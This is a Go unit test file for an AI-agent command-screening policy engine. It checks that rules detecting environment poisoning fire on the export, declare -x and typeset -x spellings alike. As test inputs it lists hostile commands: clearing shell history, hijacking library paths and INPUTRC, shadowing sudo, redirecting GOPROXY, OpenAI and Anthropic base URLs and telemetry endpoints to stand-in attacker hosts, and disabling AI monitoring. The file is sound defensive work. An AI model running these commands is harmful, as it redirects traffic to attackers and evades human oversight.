package policy

import (
	"strings"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/ossbuild"
)

// requirePremiumPack skips the caller when packs/premium/ is absent, so an
// assertion ABOUT a premium rule ID reports SKIP in the published tree instead
// of failing the OSS Distribution nightly. This package's first premium-
// dependent assertions arrived with #3684 and turned that nightly red on
// 2026-09-08 — 23 failures, every one a premium rule that cannot be loaded
// because scripts/publish-oss.sh removed the pack it lives in.
//
// Detection is internal/ossbuild, the single mechanism; see its doc comment for
// which of the two shapes (skip vs. per-build constant) applies where.
func requirePremiumPack(t *testing.T) {
	t.Helper()
	if !ossbuild.PremiumPacksPresent() {
		t.Skip("PREMIUM — packs/premium/ not present (OSS build)")
	}
}

// TestDeclarationBuiltinSpellingParity is the fitness function for #3684.
//
// `export V=x`, `declare -x V=x` and `typeset -x V=x` are the same declaration
// to bash — verified, not assumed, by asking a CHILD shell what it inherits
// (bash 3.2):
//
//	export V=hello      -> child sees [hello]
//	declare -x V=hello  -> child sees [hello]
//	typeset -x V=hello  -> child sees [hello]
//	declare V=hello     -> child sees []          (no -x, never exported)
//	readonly V=hello    -> child sees []
//
// #3212 closed this on seven env-poisoning rules. #3558 enumerated the residue
// as "Gap 2" and closed without fixing or tracking it; #3684 re-measured and
// found twelve rules still keyword-anchored. This table is the anti-regression
// half of that fix.
//
// WHY A UNIT TEST AND NOT ONLY CORPUS CASES. Five of the twelve decide AUDIT,
// which is also the engine's default. A corpus row asserting AUDIT therefore
// passes whether the rule fired or nothing fired at all — it cannot see the
// defect this PR closes, because the defect on those five was never a decision
// change. It was the loss of the RULE ID: an audit event with no rule and no
// taxonomy is the one shape the attestation chain cannot represent (the same
// gap the env-assignment half of #3630 closed on the protected-path side).
//
// So every row asserts the rule's OWN id is in TriggeredRules. `Decision ==
// BLOCK` is deliberately not the assertion — the tool-name render-evasion work
// learned that the hard way, where a broad companion rule kept a parity test
// green with the fix entirely removed. Assert the control's own rule id.
func TestDeclarationBuiltinSpellingParity(t *testing.T) {
	engine := newAllPacksEngine(t)

	type row struct {
		rule     string
		spelling string
		command  string
	}

	// Each group is one rule x the spellings that must attribute to it.
	// The `export` row in every group is the positive control: if it stops
	// firing, the group is testing nothing and the failure says so.
	//
	// FIVE ROWS LIVE HERE INSTEAD OF IN THE CORPUS, deliberately (#3703's
	// lesson, applied): the position-anchored branches — `HISTFILESIZE=0`,
	// `HISTSIZE=0 bash`, and the three Go inline prefixes. Added as corpus
	// cases they pushed TestWrapperValueFlagParity from 46/2655 to 51/2674
	// against a budget of 46, and TestShellSourceCarrierParity/CONTROL-sudo
	// from 39 to 44 against 43 — exactly +5 on each, measured, all five the
	// same rows.
	//
	// That is a probe artifact, not a bypass, and raising the budget would
	// have buried it. An assignment prefix is only an assignment prefix at the
	// start of a command: `sudo HISTFILESIZE=0` is not a shell assignment at
	// all, it asks sudo to execute a program named `HISTFILESIZE=0`. The
	// wrapper-composed forms of these five do nothing, so counting them as
	// leaks reports bypasses for commands that cannot run — the same artifact
	// CLAUDE.md records for `~` in the unset-param probe. The budgets are
	// corpus-wide, so they cannot express "this row is not wrappable"; a unit
	// test asserting the rule id can, and does.
	rows := []row{
		// --- community: present in BOTH trees ---
		{"ts-block-export-func-shadow", "export", "export -f sudo"},
		{"ts-block-export-func-shadow", "declare -fx", "declare -fx sudo"},
		{"ts-block-export-func-shadow", "typeset -fx", "typeset -fx curl"},
		{"ts-block-export-func-shadow", "declare -xf", "declare -xf docker"},

		{"ts-block-history-tamper", "export", "export HISTSIZE=0"},
		{"ts-block-history-tamper", "declare -x", "declare -x HISTSIZE=0"},
		{"ts-block-history-tamper", "typeset -x", "typeset -x HISTFILESIZE=0"},
		{"ts-block-history-tamper", "bare", "HISTFILESIZE=0"},
		{"ts-block-history-tamper", "inline", "HISTSIZE=0 bash"},

		{"ts-block-inputrc-override", "export", "export INPUTRC=/tmp/evil-inputrc"},
		{"ts-block-inputrc-override", "declare -x", "declare -x INPUTRC=/tmp/evil-inputrc"},
		{"ts-block-inputrc-override", "typeset -x", "typeset -x INPUTRC=/dev/shm/.inputrc"},
		{"ts-block-inputrc-override", "inline", "INPUTRC=/tmp/malicious.rc bash"},

		{"ts-block-ld-library-path-poison", "export", "export LD_LIBRARY_PATH=/tmp/evil:/usr/lib"},
		{"ts-block-ld-library-path-poison", "declare -x", "declare -x LD_LIBRARY_PATH=/tmp/evil:/usr/lib"},
		{"ts-block-ld-library-path-poison", "typeset -x", "typeset -x LD_LIBRARY_PATH=/dev/shm/libs"},

		{"ts-audit-ld-library-path-export", "export", "export LD_LIBRARY_PATH=/opt/myapp/lib"},
		{"ts-audit-ld-library-path-export", "declare -x", "declare -x LD_LIBRARY_PATH=/opt/myapp/lib"},
		{"ts-audit-ld-library-path-export", "typeset -x", "typeset -x LD_LIBRARY_PATH=/opt/myapp/lib"},

		{"ts-audit-ai-monitoring-disable-export", "export", "export WANDB_MODE=disabled"},
		{"ts-audit-ai-monitoring-disable-export", "declare -x", "declare -x WANDB_MODE=disabled"},
		{"ts-audit-ai-monitoring-disable-export", "typeset -x", "typeset -x LANGCHAIN_TRACING_V2=false"},
	}

	// --- premium: absent from the tree scripts/publish-oss.sh publishes ---
	//
	// A separate slice rather than a per-row flag, so the tier is stated once
	// and cannot be mis-set on a row. Every rule below lives in packs/premium/,
	// so in the OSS build newAllPacksEngine cannot load it and the assertion
	// ("the rule's OWN id is in TriggeredRules") is not weakened — it is
	// unanswerable. That is the skip shape, not the per-build-constant shape;
	// see internal/ossbuild.
	premiumRows := []row{
		{"sc-block-go-nosum-env-export", "export", "export GONOSUMCHECK=*"},
		{"sc-block-go-nosum-env-export", "declare -x", "declare -x GONOSUMCHECK=*"},
		{"sc-block-go-nosum-env-export", "typeset -x", "typeset -x GONOSUMDB=example.com/private"},
		{"sc-block-go-nosum-env-export", "inline", "GONOSUMDB=example.com/private go get ./..."},

		{"sc-block-goflags-insecure-export", "export", "export GOFLAGS=-insecure"},
		{"sc-block-goflags-insecure-export", "declare -x", "declare -x GOFLAGS=-insecure"},
		{"sc-block-goflags-insecure-export", "typeset -x", "typeset -x GOFLAGS=-mod=mod"},
		{"sc-block-goflags-insecure-export", "inline", "GOFLAGS=-insecure go build ./..."},

		{"sc-block-goproxy-env-export", "export", "export GOPROXY=https://evil-proxy.example.com"},
		{"sc-block-goproxy-env-export", "declare -x", "declare -x GOPROXY=https://evil-proxy.example.com"},
		{"sc-block-goproxy-env-export", "typeset -x", "typeset -x GOPROXY=http://attacker.io/goproxy"},
		{"sc-block-goproxy-env-export", "inline", "GOPROXY=https://evil-proxy.example.com go get ./..."},

		{"sc-block-ai-endpoint-env-override", "export", "export OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1"},
		{"sc-block-ai-endpoint-env-override", "declare -x", "declare -x OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1"},
		{"sc-block-ai-endpoint-env-override", "typeset -x", "typeset -x ANTHROPIC_BASE_URL=https://attacker.io/api"},

		// ne-audit-ai-gateway-centralization is NOT here — see
		// TestGatewayCentralizationIsMaskedByItsBlockSibling below.

		{"ts-audit-otel-endpoint-redirect", "export", "export OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.io/v1/traces"},
		{"ts-audit-otel-endpoint-redirect", "declare -x", "declare -x OTEL_EXPORTER_OTLP_ENDPOINT=https://attacker.io/v1/traces"},
		{"ts-audit-otel-endpoint-redirect", "typeset -x", "typeset -x OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=https://evil-collector.net/otlp"},

		{"ts-audit-llm-sdk-observability-endpoint-redirect", "export", "export LANGFUSE_HOST=https://attacker.io"},
		{"ts-audit-llm-sdk-observability-endpoint-redirect", "declare -x", "declare -x LANGFUSE_HOST=https://attacker.io"},
		{"ts-audit-llm-sdk-observability-endpoint-redirect", "typeset -x", "typeset -x PHOENIX_COLLECTOR_ENDPOINT=https://malicious-collector.net"},
	}

	check := func(r row, premium bool) {
		t.Run(r.rule+"/"+r.spelling, func(t *testing.T) {
			if premium {
				requirePremiumPack(t)
			}
			res := engine.Evaluate(r.command, nil)
			if !firedExactRuleID(res.TriggeredRules, r.rule) {
				t.Errorf("%s did not fire on the %s spelling\n  command: %s\n  decision: %s\n  fired: %v",
					r.rule, r.spelling, r.command, res.Decision, res.TriggeredRules)
			}
		})
	}
	for _, r := range rows {
		check(r, false)
	}
	for _, r := range premiumRows {
		check(r, true)
	}

	// Vacuity floor. If the pack files stop loading, or the rule ids are
	// renamed, every row above would silently test nothing while the loop
	// still reports zero failures on zero comparisons.
	//
	// Split per tier after #3684's rows started skipping in the OSS build: one
	// combined floor would still be met by 44 rows of which 22 skipped, so a
	// community row quietly deleted from the published tree's only gate would
	// not trip it.
	// Measured 22 community + 21 premium; the floors keep the original's ~12%
	// slack for an honest row swap and nothing like room for a tier to vanish.
	if len(rows) < 20 {
		t.Fatalf("community parity rows shrank to %d — #3684 covered 6 community rules across 22 rows; a shrinking table is how this gate stops checking anything", len(rows))
	}
	if len(premiumRows) < 19 {
		t.Fatalf("premium parity rows shrank to %d — #3684 covered 6 premium rules across 21 rows; a shrinking table is how this gate stops checking anything", len(premiumRows))
	}
}

// TestGatewayCentralizationIsMaskedByItsBlockSibling records a pre-existing
// finding that surfaced while writing the #3684 parity table, and pins the
// widening at the level where it IS observable.
//
// ne-audit-ai-gateway-centralization (premium, AUDIT) matches the same six
// variables as sc-block-ai-endpoint-env-override (premium, BLOCK), narrowed to
// six known gateway hostnames. None of those hostnames is localhost, so the
// BLOCK rule's exclusion never applies to them: every command the gateway rule
// matches is matched by the BLOCK rule too. TriggeredRules reports the winning
// tier, so the gateway rule can never appear in an audit event on a full-pack
// install — including on its OWN seven TP fixtures, on `export`, on main,
// before this PR. Measured through `check --shell-file` against a binary built
// from origin/main.
//
// This PR does not change that and deliberately does not try to: which of two
// premium rules should own this detection, and whether an AUDIT rule shadowed
// by a BLOCK sibling should exist at all, is a rule-content and tiering call
// (both rules are premium, so it is not a community/premium boundary question,
// but it is still Gary's). Reported on #3684 rather than decided here.
//
// What this test does assert is that the #3684 widening reached the rule's own
// pattern, at rule level via matchRule — the same level TestRuleYAMLTests
// grades inline fixtures at. Without this the three declaration rows would have
// been silently dropped from coverage when they were pulled out of the pipeline
// table above.
func TestGatewayCentralizationIsMaskedByItsBlockSibling(t *testing.T) {
	// Both rules are premium, so in the published tree this test's own
	// precondition ("both premium rules must be loaded — without them this test
	// proves nothing") is false by construction. It said so and then t.Fatal'd,
	// which is the right assertion in the full tree and a guaranteed red in the
	// OSS one.
	requirePremiumPack(t)

	rules := loadAllRules(t)
	pol := &Policy{Rules: rules}
	engine, err := NewEngine(pol)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	var gateway, blocker *Rule
	for i := range rules {
		switch rules[i].ID {
		case "ne-audit-ai-gateway-centralization":
			gateway = &rules[i]
		case "sc-block-ai-endpoint-env-override":
			blocker = &rules[i]
		}
	}
	if gateway == nil || blocker == nil {
		t.Fatal("both premium rules must be loaded — without them this test proves nothing")
	}

	for _, cmd := range []string{
		"export OPENAI_BASE_URL=https://oai.helicone.ai/v1",
		"declare -x OPENAI_BASE_URL=https://oai.helicone.ai/v1",
		"typeset -x ANTHROPIC_BASE_URL=https://cloud.langfuse.com",
	} {
		t.Run(cmd, func(t *testing.T) {
			if !engine.matchRule(cmd, *gateway) {
				t.Errorf("%s must match %q — this is the #3684 widening", gateway.ID, cmd)
			}
			// The masking half. If this ever stops holding, the rule became
			// independently visible and the note above needs revisiting.
			if !engine.matchRule(cmd, *blocker) {
				t.Errorf("expected %s to also match %q; if it no longer does, %s is no longer masked and the comment on this test is stale",
					blocker.ID, cmd, gateway.ID)
			}
		})
	}
}

// TestDeclarationBuiltinNonExportingFormsStayUncovered is the other half, and
// it is the half that keeps the widening honest.
//
// Without `-x` nothing is exported: the child process never sees the variable
// and none of these threats can fire. A rule that blocked these would assert an
// attack that does not exist, and "it looks like a declaration builtin" is
// exactly the intuition that produces one. #3212 recorded the same boundary for
// `readonly`; this extends it to the twelve rules #3684 widened.
func TestDeclarationBuiltinNonExportingFormsStayUncovered(t *testing.T) {
	engine := newAllPacksEngine(t)

	cases := []struct {
		rule    string
		command string
		why     string
	}{
		{"ts-block-export-func-shadow", "declare -f sudo",
			"-f alone PRINTS the definition; a child reports NOT-EXPORTED"},
		{"ts-block-export-func-shadow", "declare -x sudo",
			"-x alone exports a VARIABLE named sudo, not the function"},
		{"ts-block-inputrc-override", "declare INPUTRC=/tmp/evil-inputrc",
			"readline reads the ENVIRONMENT; an unexported shell var never reaches it"},
		{"ts-audit-ai-monitoring-disable-export", "declare WANDB_MODE=disabled",
			"no -x, so no child training process reads it"},
		{"sc-block-ai-endpoint-env-override", "declare OPENAI_BASE_URL=https://evil-proxy.attacker.com/v1",
			"no -x, so no SDK child process reads the override"},
		{"sc-block-goflags-insecure-export", "declare GOFLAGS=-insecure",
			"no -x, so `go` never sees the flag"},

		// Value boundaries, not keyword boundaries: these sit in exactly the
		// position each widening added and must stay out on their value.
		{"ts-block-history-tamper", "HISTSIZE=5000 bash",
			"inline position, non-zero size — a real history limit, not tampering"},
		{"ts-audit-ai-monitoring-disable-export", "declare -x WANDB_MODE=online",
			"declaration position, monitoring-ENABLING value"},
		{"sc-block-ai-endpoint-env-override", "declare -x OPENAI_BASE_URL=http://localhost:11434",
			"declaration position, localhost — the rule's exclude must reach the new branch"},
		{"sc-block-goproxy-env-export", "GOPROXY=https://proxy.golang.org go get ./...",
			"inline position, official proxy — the rule's exclude must reach the new branch"},
		{"sc-block-goflags-insecure-export", "GOFLAGS=-v go build ./...",
			"inline position, benign flag"},

		// Position boundary: the same token as a search needle. This is the
		// whole FP budget of the bare-assignment branch (#3366/#3382 — a count
		// of a suspicious token is not evidence, position is).
		{"ts-block-history-tamper", "grep HISTSIZE=0 ~/.bashrc",
			"argument slot, not a command-initial assignment"},
		{"ts-block-history-tamper", "rg HISTFILESIZE=0 docs/",
			"argument slot, not a command-initial assignment"},
	}

	for _, c := range cases {
		t.Run(c.rule+"/"+c.command, func(t *testing.T) {
			res := engine.Evaluate(c.command, nil)
			if firedExactRuleID(res.TriggeredRules, c.rule) {
				t.Errorf("%s fired on a form it must not cover: %s\n  reason it must not: %s\n  decision: %s",
					c.rule, c.command, c.why, res.Decision)
			}
		})
	}
}

// newAllPacksEngine builds a full-pipeline engine over the default policy plus
// every pack in packs/ (community AND premium — six of the twelve rules #3684
// fixed are premium-only, so an embedded-community-only engine would silently
// skip half the table).
func newAllPacksEngine(t *testing.T) *Engine {
	t.Helper()
	base := DefaultPolicy()
	pol, infos, err := LoadPacks(packsDir(), base)
	if err != nil {
		t.Fatalf("LoadPacks: %v", err)
	}
	if loadErr := firstPackLoadError(infos); loadErr != nil {
		t.Fatal(loadErr)
	}
	engine, err := NewEngineWithAnalyzers(pol, 0)
	if err != nil {
		t.Fatalf("NewEngineWithAnalyzers: %v", err)
	}
	return engine
}

// firedExactRuleID is an EXACT match, deliberately not the package's existing
// substring helper. A substring test would let a longer sibling id vouch for
// the id under test, which is the same "a broad companion rule keeps the parity
// test green with the fix removed" trap the tool-name render-evasion work hit.
func firedExactRuleID(fired []string, id string) bool {
	for _, f := range fired {
		if strings.EqualFold(f, id) {
			return true
		}
	}
	return false
}
